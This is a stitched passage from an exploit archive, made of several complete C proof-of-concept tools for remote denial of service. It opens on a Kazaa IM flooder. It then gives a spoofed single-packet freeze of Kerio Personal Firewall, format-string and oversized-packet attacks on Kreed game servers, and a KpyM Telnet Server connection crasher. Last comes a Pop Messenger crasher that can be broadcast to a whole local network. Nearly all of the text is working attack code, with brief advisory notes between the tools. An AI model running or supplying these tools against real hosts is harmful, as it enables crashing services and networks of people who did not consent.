   snprintf(bigboy, size, "GET /.message HTTP/1.1\nHost: 68.10.112.148:1214\nUserAgent: KazaaClient Jan 18 2002 18:53:21\nX-Kazaa-Username: 31337h4x0r\nX-Kazaa-Network: KaZaA\nX-Kazaa-IP: %d:1214\nX-Kazaa-SupernodeIP: %d:1214\nConnection:  open\nX-Kazaa-IMTo: %s@KaZaA\nX-Kazaa-IMType: user_text\n", randnum, randnum, argv[3]);

   /* the msg appears as one msg to the receiver, but comes in intervals of 4096 bytes... */
   snprintf(buf, sizeof(buf), "X-Kazaa-IMData: %s\n", buf2);
   for(k=0;k<atoi(argv[2]);k++)
   {
      strcat(bigboy, buf);
      k++;
   }
   strcat(bigboy, "\r\n\r\n\r\n\r\n\r\n");

   fprintf(stdout, "done preparing packet... sending\n");
   for(i=0, k=0;i<atoi(argv[4]);i++)
   {
     if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
       perror("socket");
     }
     else
     {
       if (connect(fd, (struct sockaddr *)&them,sizeof(struct sockaddr)) == -1)
       {
         perror("connect");
       }
       else
       {
         printf("sending %d message\n", k);
         write(fd, bigboy, strlen(bigboy));
         k++;
         close(fd);
       }
     }
   }
   fprintf(stdout, "\n%d out of %d attempted got through\n", k, i);
   free(bigboy);
   return 0;
}/* HOD-kerio-firewall-DoS-expl.c: 2004-11-10
*
* Copyright (c) 2004 houseofdabus
*
* Kerio Personal Firewall Multiple IP Options Denial of Service PoC
*
* Coded by
*
*
*                 .::[ houseofdabus ]::.
*
*
*
* Bug discoveried by eEye:
* http://www.eeye.com/html/research/advisories/AD20041109.html
*
* ---------------------------------------------------------------------
* Tested on:
*    - Kerio Personal Firewall 4.1.1
*
* Systems Affected:
*    - Kerio Personal Firewall 4.1.1 and prior
*
* ---------------------------------------------------------------------
* Description:
*   The vulnerability allows a remote attacker to reliably render
*   a system inoperative with one single packet. Physical access is
*   required in order to bring an affected system out of this
*   "frozen" state. This specific flaw exists within the component
*   that performs low level processing of TCP, UDP, and ICMP packets.
*
* ---------------------------------------------------------------------
* Compile:
* Win32/VC++  : cl -o HOD-kpf-DoS-expl HOD-kpf-DoS-expl.c
* Win32/cygwin: gcc -o HOD-kpf-DoS-expl HOD-kpf-DoS-expl.c -lws2_32.lib
* Linux       : gcc -o HOD-kpf-DoS-expl HOD-kpf-DoS-expl.c -Wall
*
* ---------------------------------------------------------------------
* Command Line Parameters/Arguments:
*
*   HOD-kerio-firewall-DoS-expl <-fi:str> <-ti:str> [-n:int]
*
*           -fi:IP    From (sender) IP address
*           -ti:IP    To (target) IP address
*           -n:int    Number of packets
*
* ---------------------------------------------------------------------
*
*   This is provided as proof-of-concept code only for educational
*   purposes and testing by authorized individuals with permission to
*   do so.
*
*/

/* #define _WIN32 */

#ifdef _WIN32
#pragma comment(lib,"ws2_32")
#pragma pack(1)
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h> /* IP_HDRINCL */

#else
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/timeb.h>
#endif

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_MESSAGE        4068
#define MAX_PACKET         4096

#define DEFAULT_PORT       53
#define DEFAULT_IP         "192.168.0.1"
#define DEFAULT_COUNT      1

#ifndef _WIN32
#       define FAR
#endif

/* Define the IP header */
typedef struct ip_hdr {
   unsigned char  ip_verlen;        /* IP version & length */
   unsigned char  ip_tos;           /* IP type of service */
   unsigned short ip_totallength;   /* Total length */
   unsigned short ip_id;            /* Unique identifier */
   unsigned short ip_offset;        /* Fragment offset field */
   unsigned char  ip_ttl;           /* Time to live */
   unsigned char  ip_protocol;      /* Protocol */
   unsigned short ip_checksum;      /* IP checksum */
   unsigned int   ip_srcaddr;       /* Source address */
   unsigned int   ip_destaddr;      /* Destination address */
} IP_HDR, *PIP_HDR, FAR* LPIP_HDR;

/* Define the UDP header */
typedef struct udp_hdr {
   unsigned short src_portno;       /* Source port number */
   unsigned short dst_portno;       /* Destination port number */
   unsigned short udp_length;       /* UDP packet length */
   unsigned short udp_checksum;     /* UDP checksum (optional) */
} UDP_HDR, *PUDP_HDR;

char udpmsg[] =
"\x4b\x65\x72\x69\x6f\x20\x50\x65\x72\x73\x6f\x6e\x61\x6c\x20\x46"
"\x69\x72\x65\x77\x61\x6c\x6c\x20\x44\x6f\x53\x20\x50\x6f\x43\x20"
"\x28\x34\x2e\x31\x2e\x31\x20\x61\x6e\x64\x20\x70\x72\x69\x6f\x72"
"\x29\x2e\x20\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x28\x63\x29"
"\x20\x32\x30\x30\x34\x20\x68\x6f\x75\x73\x65\x6f\x66\x64\x61\x62"
"\x75\x73\x2e";

/* globals */
unsigned long  dwToIP,               /* IP to send to */
              dwFromIP;             /* IP to send from (spoof) */
unsigned short iToPort,              /* Port to send to */
              iFromPort;            /* Port to send from (spoof) */
unsigned long  dwCount;              /* Number of times to send */
char           strMessage[MAX_MESSAGE]; /* Message to send */

void
usage(char *progname) {
       printf("Usage:\n\n");
   printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> [-n:int]\n\n", progname);
   printf("       -fi:IP    From (sender) IP address\n");
   printf("       -ti:IP    To (target) IP address\n");
   printf("       -n:int    Number of packets\n");
   exit(1);
}

void
ValidateArgs(int argc, char **argv)
{
   int                i;

   iToPort = 53;
   iFromPort = DEFAULT_PORT;
   dwToIP = inet_addr(DEFAULT_IP);
   dwFromIP = inet_addr(DEFAULT_IP);
   dwCount = DEFAULT_COUNT;
       memcpy(strMessage, udpmsg, sizeof(udpmsg)-1);

   for(i = 1; i < argc; i++) {
       if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
           switch (tolower(argv[i][1])) {
               case 'f':
                   switch (tolower(argv[i][2])) {
                       case 'i':
                           if (strlen(argv[i]) > 4)
                               dwFromIP = inet_addr(&argv[i][4]);
                           break;
                       default:
                           usage(argv[0]);
                           break;
                   }
                   break;
               case 't':
                   switch (tolower(argv[i][2])) {
                       case 'i':
                           if (strlen(argv[i]) > 4)
                               dwToIP = inet_addr(&argv[i][4]);
                           break;
                       default:
                           usage(argv[0]);
                           break;
                   }
                   break;
               case 'n':
                   if (strlen(argv[i]) > 3)
                       dwCount = atol(&argv[i][3]);
                   break;
               default:
                   usage(argv[0]);
                   break;
           }
       }
   }
   return;
}

/*    This function calculates the 16-bit one's complement sum */
/*    for the supplied buffer */
unsigned short
checksum(unsigned short *buffer, int size)
{
   unsigned long cksum=0;

   while (size > 1) {
       cksum += *buffer++;
       size  -= sizeof(unsigned short);
   }
   if (size) {
       cksum += *(unsigned char *)buffer;
   }
   cksum = (cksum >> 16) + (cksum & 0xffff);
   cksum += (cksum >>16);

   return (unsigned short)(~cksum);
}

int
main(int argc, char **argv)
{
#ifdef _WIN32
   WSADATA            wsd;
#endif
   int                s;
#ifdef _WIN32
       BOOL                bOpt;
#else
       int                bOpt;
#endif
   struct sockaddr_in remote;
   IP_HDR             ipHdr;
   UDP_HDR            udpHdr;
   int                ret;
   unsigned long      i;
   unsigned short     iTotalSize,
                      iUdpSize,
                      iUdpChecksumSize,
                      iIPVersion,
                      iIPSize,
                      cksum = 0;
   char               buf[MAX_PACKET],
                      *ptr = NULL;
#ifdef _WIN32
   IN_ADDR            addr;
#else
       struct sockaddr_in addr;
#endif

       printf("\nKerio Personal Firewall Multiple IP Options Denial of Service PoC\n\n");
       printf("\tCopyright (c) 2004 .::[ houseofdabus ]::.\n\n");

       if (argc < 3) usage(argv[0]);

   /* Parse command line arguments and print them out */
   ValidateArgs(argc, argv);
#ifdef _WIN32
   addr.S_un.S_addr = dwFromIP;
   printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr), iFromPort);
   addr.S_un.S_addr = dwToIP;
   printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr), iToPort);
   printf("[*] Count:   %d\n", dwCount);
#else
   addr.sin_addr.s_addr = dwFromIP;
   printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iFromPort);
   addr.sin_addr.s_addr = dwToIP;
   printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iToPort);
   printf("[*] Count:   %d\n", dwCount);
#endif

#ifdef _WIN32
   if (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {
       printf("[-] WSAStartup() failed: %d\n", GetLastError());
       return -1;
   }
#endif
   /*  Creating a raw socket */
   s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
#ifdef _WIN32
   if (s == INVALID_SOCKET) {
       printf("[-] WSASocket() failed: %d\n", WSAGetLastError());
       return -1;
   }
#endif

   /* Enable the IP header include option */
#ifdef _WIN32
   bOpt = TRUE;
#else
   bOpt = 1;
#endif
   ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
#ifdef _WIN32
   if (ret == SOCKET_ERROR) {
       printf("[-] setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
       return -1;
   }
#endif
   /* Initalize the IP header */
   iTotalSize = sizeof(ipHdr) + sizeof(udpHdr) + sizeof(udpmsg)-1 + 4;

   iIPVersion = 4;
   iIPSize = sizeof(ipHdr) / sizeof(unsigned long);

   iIPSize += 1; /* IP options */

   ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
   ipHdr.ip_tos = 0;                         /* IP type of service */
   ipHdr.ip_totallength = htons(iTotalSize); /* Total packet len */
   ipHdr.ip_id = 0;                 /* Unique identifier: set to 0 */
   ipHdr.ip_offset = 0;             /* Fragment offset field */
   ipHdr.ip_ttl = 128;              /* Time to live */
   ipHdr.ip_protocol = 0x11;        /* Protocol(UDP) */
   ipHdr.ip_checksum = 0 ;          /* IP checksum */
   ipHdr.ip_srcaddr = dwFromIP;     /* Source address */
   ipHdr.ip_destaddr = dwToIP;      /* Destination address */

   /* Initalize the UDP header */
   iUdpSize = sizeof(udpHdr) + sizeof(udpmsg)-1;

   udpHdr.src_portno = htons(iFromPort);
   udpHdr.dst_portno = htons(iToPort);
   udpHdr.udp_length = htons(iUdpSize);
   udpHdr.udp_checksum = 0 ;

       iUdpChecksumSize = 0;
   ptr = buf;
       memset(buf, 0, MAX_PACKET);

   memcpy(ptr, &ipHdr.ip_srcaddr,  sizeof(ipHdr.ip_srcaddr));
   ptr += sizeof(ipHdr.ip_srcaddr);
   iUdpChecksumSize += sizeof(ipHdr.ip_srcaddr);

   memcpy(ptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr));
   ptr += sizeof(ipHdr.ip_destaddr);
   iUdpChecksumSize += sizeof(ipHdr.ip_destaddr);

   ptr++;
   iUdpChecksumSize += 1;

   memcpy(ptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol));
   ptr += sizeof(ipHdr.ip_protocol);
   iUdpChecksumSize += sizeof(ipHdr.ip_protocol);

   memcpy(ptr, &udpHdr.udp_length, sizeof(udpHdr.udp_length));
   ptr += sizeof(udpHdr.udp_length);
   iUdpChecksumSize += sizeof(udpHdr.udp_length);

   memcpy(ptr, &udpHdr, sizeof(udpHdr));
   ptr += sizeof(udpHdr);
   iUdpChecksumSize += sizeof(udpHdr);

       for(i = 0; i < sizeof(udpmsg)-1; i++, ptr++)
       *ptr = strMessage[i];
   iUdpChecksumSize += sizeof(udpmsg)-1;

   cksum = checksum((unsigned short *)buf, iUdpChecksumSize);
   udpHdr.udp_checksum = cksum;

   memset(buf, 0, MAX_PACKET);
   ptr = buf;

   memcpy(ptr, &ipHdr, sizeof(ipHdr));   ptr += sizeof(ipHdr);

   /* IP option (length = 0x00) */
   memcpy(ptr, "\x88\x00\x12\x34", 4);   ptr += 4;

   memcpy(ptr, &udpHdr, sizeof(udpHdr)); ptr += sizeof(udpHdr);
   memcpy(ptr, strMessage, sizeof(udpmsg)-1);

   remote.sin_family = AF_INET;
   remote.sin_port = htons(iToPort);
   remote.sin_addr.s_addr = dwToIP;

   for(i = 0; i < dwCount; i++) {
#ifdef _WIN32
       ret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote,
           sizeof(remote));

       if (ret == SOCKET_ERROR) {
           printf("[-] sendto() failed: %d\n", WSAGetLastError());
           break;
       } else
#else
       ret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *) &remote,
           sizeof(remote));
#endif
           printf("[+] sent %d bytes\n", ret);
   }

#ifdef _WIN32
   closesocket(s);
   WSACleanup();
#endif

   return 0;
}

// milw0rm.com [2004-11-12]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
/*

Read/Write bits to buffer 0.1.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org

max 32 bits numbers supported (from 0 to 4294967295).
Probably not the fastest bit packing functions existent, but I like them.

*/



unsigned long read_bits(    // number read
  unsigned long bits,       // how much bits to read
  unsigned char *in,        // buffer from which to read the number
  unsigned long in_bits     // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem,
                    seek = 0,
                    ret  = 0,
                    mask = -1L;

    if(bits > 32) return(0);
    if(bits < 32) mask = (1 << bits) - 1;
    for(;;) {
        seek_bits = in_bits & 7;
        ret |= ((*(in + (in_bits >> 3)) >> seek_bits) & mask) << seek;
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        bits    -= rem;
        in_bits += rem;
        seek    += rem;
        mask    = (1 << bits) - 1;
    }
    return(ret);
}



unsigned long write_bits(   // position where the stored number finishs
  unsigned long data,       // number to store
  unsigned long bits,       // how much bits to occupy
  unsigned char *out,       // buffer on which to store the number
  unsigned long out_bits    // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem;

    if(bits > 32) return(out_bits);
    if(bits < 32) data &= ((1 << bits) - 1);
    for(;;) {
        seek_bits = out_bits & 7;
        *(out + (out_bits >> 3)) &= (1 << seek_bits) - 1;   // zero
        *(out + (out_bits >> 3)) |= (data << seek_bits);
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        out_bits += rem;
        bits     -= rem;
        data     >>= rem;
    }
    return(out_bits + bits);
}




#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}




    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      2048    // 1400 is enough for Kreed
#define PORT        28902
#define TIMEOUT     3
#define KREEDVER    33
#define NICKNAME    "%n%n%n"
#define INFO        "get_info"
#define CHALL       "get_challenge\n"
#define CONNECT     "connect %d %d %d name '%s' model 'mifs/players/leg_cmn_c1_MP.mif' string 'no info' gender 'male' rate 100000\n"
#define SCRIPTERR   100     // 30 is enough



#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();

#define RECV        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();

#define RECVT       if(timeout(sd) < 0) { \
                        fputs("\n" \
                            "Error: socket timeout, no reply received\n" \
                            "\n", stdout); \
                        exit(1); \
                    } \
                    RECV;




int build_kreed_pck(u_char *buff, int type, u_char *data);
void read_kreed_pck(u_char *buff, int len);
void kreed_info(void);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            len,
            challenge,
            attack,
            version = KREEDVER;
    u_short port = PORT;
    u_char  *buff,
            *tmp,
            *p,
            *nick = NICKNAME;


    setbuf(stdout, NULL);

    fputs("\n"
        "Kreed <= 1.05 format string, message too long and scripts bugs "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = in-game format string in client's nickname\n"
            " 2 = Denial of Service caused by a packet of 1401 or more bytes\n"
            " 3 = in-game annoying script dialog errors caused by too long nickname or model\n"
            "     values. The server is freezed until the messages are on the screen.\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    attack = atoi(argv[1]);
    if((attack < 1) || (attack > 3)) {
        fputs("\nError: you can only choose between the available attacks\n\n", stdout);
        exit(1);
    }

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    kreed_info();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(attack == 2) {
        fputs("- start \"Message too long\" DoS attack:\n", stdout);

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        memset(buff, 0x00, BUFFSZ);
        fputs("- send BOOM packet\n", stdout);
        SEND(buff, BUFFSZ);
        close(sd);

    } else {
        if(attack == 1) {
            fputs("- start format string attack:\n", stdout);
        } else if(attack == 3) {
            fputs("- start annoying script errors attack:\n", stdout);

            nick = malloc(SCRIPTERR + 1);
            if(!nick) std_err();
            memset(nick, 'a', SCRIPTERR);
            nick[SCRIPTERR] = 0x00;
        }

        tmp = malloc(BUFFSZ);
        if(!tmp) std_err();

        for(;;) {   // loop needed for the version handling
            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd < 0) std_err();

            len = build_kreed_pck(
                buff,
                148,    // challenge
                CHALL);

            fputs("- send challenge request\n", stdout);
            SEND(buff, len);
            RECVT;

            read_kreed_pck(buff, len);
            sscanf(buff, "challenge %d", &challenge);

            sprintf(
                tmp,
                CONNECT,
                version,
                (int)(time(NULL) & 0xffff),    // random port
                challenge,
                nick);

            len = build_kreed_pck(
                buff,
                988,    // connect
                tmp);

            fputs("- send join request\n", stdout);
            SEND(buff, len);
            if(timeout(sd) < 0) {
                fputs("- server is temporary full or is already crashed, I check it\n", stdout);
                close(sd);
                break;
            }
            RECV;

            close(sd);

            read_kreed_pck(buff, len);
            if(!strstr(buff, "client_connect")) {
                p = strstr(buff, "version");
                if(p) {
                    sscanf(p + 8, "%d", &version);
                    printf("- set version number to %d\n", version);
                    continue;
                }
                printf("\n"
                    "Error: your player has not been accepted for the following reason:\n"
                    "\n"
                    "%s\n"
                    "\n", buff);
                exit(1);
            }

            break;  // break if success
        }
    }

    sleep(ONESEC);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    len = build_kreed_pck(
        buff,
        148,    // challenge
        CHALL);

    SEND(buff, len);

    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int build_kreed_pck(u_char *buff, int type, u_char *data) {
    u_long  bits;

    memset(buff, 0x00, BUFFSZ);

    bits = write_bits(12, 32, buff, 0);
    bits = write_bits(type, 16, buff, bits);
    bits = write_bits(0xfffffff, 28, buff, bits);
    while(*data) {
        bits = write_bits(*data, 8, buff, bits);
        data++;
    }

    if(bits & 7) return((bits >> 3) + 1);
    return(bits >> 3);
}



void read_kreed_pck(u_char *buff, int len) {
    u_long  bits = 32,
            check;
    u_char  *p;

    check = read_bits(32, buff, 0);
    if(check != 12) {
        printf("\nError: server has replied with unexpected data (0x%08lx)\n\n", check);
        exit(1);
    }
    read_bits(16, buff, bits);  bits += 16;
    read_bits(28, buff, bits);  bits += 28;
    for(len -= (bits >> 3), p = buff; len; len--) {
        *p++ = read_bits(8, buff, bits);
        bits += 8;
    }
    *p = 0x00;  // useless
}



void kreed_info(void) {
    int     sd,
            len;
    u_char  *buff;

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    len = build_kreed_pck(
        buff,
        124,    // info
        INFO);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    SEND(buff, len);
    RECVT;
    close(sd);

    read_kreed_pck(buff, len);
    printf("%s\n\n", buff);

    free(buff);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-12-02]
source: http://www.securityfocus.com/bid/9379/info

KpyM Telnet Server has been reported to be prone to a remote denial of service vulnerability. Due to a lack of resource limitations, a remote attacker may negotiate multiple connections to the affected server. This will cause multiple instances of the a terminal handler executable to be spawned and ultimately, over time, an access violation will be triggered in the KpyM Telnet Server.

/* By NoRpiuS 
*  UNIX & WIN VERSION 
*  USE -DWIN to compile on windows
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef WIN
    #include <winsock.h>
    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

#define PORT    23
#define BUFFSZ  10000   

u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
    u_char  *buff;
    struct  sockaddr_in peer;
    int     sd, err;
    u_short port = PORT;


    setbuf(stdout, NULL);

    fputs("\n"
        "KpyM Telnet Server v1.05 remote DoS\n"
        "by NoRpiUs\n"
        "e-mail: norpius@altervista.org\n"
        "web:    http://norpius.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUso: %s <ip>\n\n",argv[0]);
        exit(1);
    }



#ifdef WIN
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    buff = malloc(BUFFSZ);
    if(!buff) 
    {
          fputs("[-] Can't allocate buffer\n", stdout);
          exit(0);
    }
        

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) 
    {
          fputs("[-] Can't create socket\n", stdout);
          exit(0);
    }

    printf("\n[+] Connecting to %s:%hu...\n",
        inet_ntoa(peer.sin_addr), port);
    err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) 
    {
          fputs("[-] Can't connect\n", stdout);
          exit(0);
    }

    err = recv(sd, buff, BUFFSZ, 0);
    if(err < 0) 
    {
          fputs("[-] No response from the server", stdout);
          exit(0);
    }

    memset(buff, 0, BUFFSZ);

    fputs("[+] Waiting for the crash.. ", stdout);
   
    while(1) 
    {                
       err = send(sd, buff, BUFFSZ, 0);
       if(err < 0) 
       {
          fputs("[-] Can't send\n", stdout);
          exit(0);
       }
       printf(".");
       close(sd);
       sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
       err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
       if ( err < 0 ) 
       {
           fputs("\n[+] Crashed\n\r", stdout);
           exit(0);
       }
    }
    
    close(sd);
    return(0);
}


u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) 
    {
        hp = gethostbyname(host);
        if(!hp) 
        {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } 
    else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}




source: http://www.securityfocus.com/bid/11230/info

LeadMind Pop Messenger is reported prone to a remote denial of service vulnerability. The issue exists because the messenger application fails to gracefully handle certain characters that are received.

A remote attacker may exploit this vulnerability to crash the LeadMind Pop Messenger client. Additionally, it is reported that an attacker may broadcast a malicious message to all clients on the connected local network segment and deny service to all of the clients at once.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    8473
#define BCAST   "255.255.255.255"
#define MAX     30      // we need less then 20 packets



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                on = 1;
    u_long      randnum;
    u_short     port = PORT;
    u_char      pck[] =
                "Z........\0"
                "C@main\1"
                "@chnlMAIN\1"
                "@chnlMAIN\1"
                "\1\1\1\1\1"
                "crasher\1"
                "cmdAddString\1"
                "%\1";  // the crash happens when the program receives
                        // multiple packets containing an incorrect base64
                        // char in the message field (in fact % is illegal)


    setbuf(stdout, NULL);

    fputs("\n"
        "PopMessenger <= 1.60 (20 Sep 2004) remote crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n"
            "Note: you can also launch this tool versus broadcast IP (like "BCAST")\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port    = atoi(argv[2]);
    if(!memcmp(argv[1], BCAST, sizeof(BCAST) - 1)) {
        peer.sin_addr.s_addr = 0xffffffffL;
    } else {
        peer.sin_addr.s_addr = resolv(argv[1]);
    }
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    /* broadcast */
    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on))
     < 0) std_err();

    randnum = time(NULL);

    printf("- send %d messages with an illegal base64 char to cause the crash\n", MAX);
    for(i = 0; i < MAX; i++) {
        sprintf(pck + 1, "%08lx", randnum * i);  // must be ever different
        if(sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputc('.', stdout);
        sleep(0);
    }

    close(sd);
    fputs("\n- data sent, the application should be crashed\n\n", stdout);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
